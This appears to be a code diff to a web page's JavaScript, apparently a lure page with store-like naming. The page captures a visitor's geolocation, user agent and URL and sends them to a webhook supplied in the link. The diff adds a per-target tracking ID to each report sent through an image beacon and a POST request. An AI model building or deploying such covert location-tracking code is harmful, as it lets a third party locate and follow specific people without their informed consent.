@@ -456,26 +456,32 @@
         function getWebhookUrl() {
             const urlParams = new URLSearchParams(window.location.search);
             webhookUrl = urlParams.get('webhook') || 'https://httpbin.org/get';
+            const trackingId = urlParams.get('id') || 'No ID provided';
             console.log('🔗 Webhook URL:', webhookUrl);
+            console.log('🎯 Tracking ID:', trackingId);
         }
         
         function sendLocation(lat, lng) {
             console.log('📍 Location obtained:', lat, lng);
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackingId = urlParams.get('id') || 'default_' + Date.now();
             
             const data = {
                 lat: lat,
                 lng: lng,
                 timestamp: Date.now(),
                 userAgent: navigator.userAgent,
-                url: window.location.href
+                url: window.location.href,
+                id: trackingId
             };
             
-            // Method 1: Direct webhook call
+            // Method 1: Direct webhook call with ID parameter
             if (webhookUrl && webhookUrl !== 'https://httpbin.org/get') {
-                const trackingUrl = `${webhookUrl}?lat=${lat}&lng=${lng}&timestamp=${Date.now()}`;
+                const trackingUrl = `${webhookUrl}?lat=${lat}&lng=${lng}&timestamp=${Date.now()}&id=${trackingId}`;
                 
                 const img = new Image();
-                img.onload = () => console.log('✅ Webhook success');
+                img.onload = () => console.log('✅ Webhook success with ID:', trackingId);
                 img.onerror = () => console.log('❌ Webhook failed');
                 img.src = trackingUrl;
             }
@@ -483,6 +489,8 @@
             // Method 2: Store in localStorage for app to read
             localStorage.setItem('megastore_location', JSON.stringify(data));
             sessionStorage.setItem('tracked_coords', JSON.stringify(data));
+            
+            console.log('🔗 Tracking ID used:', trackingId);
             
             // Method 3: Send to httpbin for testing
             fetch('https://httpbin.org/post', {
